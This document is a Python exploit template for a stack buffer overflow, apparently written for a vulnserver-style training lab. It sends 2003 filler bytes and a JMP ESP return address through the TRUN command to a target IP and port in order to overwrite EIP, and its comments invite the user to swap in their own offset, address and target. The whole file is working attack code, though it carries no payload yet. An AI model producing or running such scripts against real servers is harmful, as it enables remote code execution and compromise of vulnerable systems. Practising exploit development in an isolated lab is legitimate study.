#!/usr/bin/python

# This program is used to test whether or not you can overwrite EIP successfully.

import sys, socket

offset_output = 2003
# Replace this with offset output

return_address = "\xaf\x11\x50\x62"
# replace this with the JMP ESP of a vulnerable dll in LITTLE ENDIAN FORMAT (reverse of value from Immunity)

shellcode = "A" * offset_output + return_address


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.6.144',9999)) 
    # Replace these with IP, port of vuln server

    s.send(('TRUN /.:/' + shellcode)) 
    # Look at immunity when it crashes to 
    # see if you need to change this part

    s.close()

except:
    print("Error connecting to server")
    sys.exit()